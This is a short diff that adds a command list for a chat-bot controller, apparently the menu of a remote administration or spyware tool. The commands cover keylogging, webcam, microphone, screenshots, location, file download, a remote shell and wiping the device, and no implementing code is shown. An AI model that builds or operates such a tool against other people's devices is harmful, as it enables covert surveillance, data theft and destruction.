@@ -1,0 +1,18 @@
+authorize - /authorize <token>
+deauthorize - /deauthorize
+permissions - /permissions
+download - /download <file/dir>
+filemanager - /filemanager
+location - /location
+keylogger - /keylogger
+information - /information
+webcam - /webcam <device>
+screenshot - /screenshot
+microphone - /microphone
+taskmanager - /taskmanager
+uninstall - /uninstall
+keyboard - /keyboard
+volume - /volume
+power - /power
+shell - /shell
+wipe - /wipe
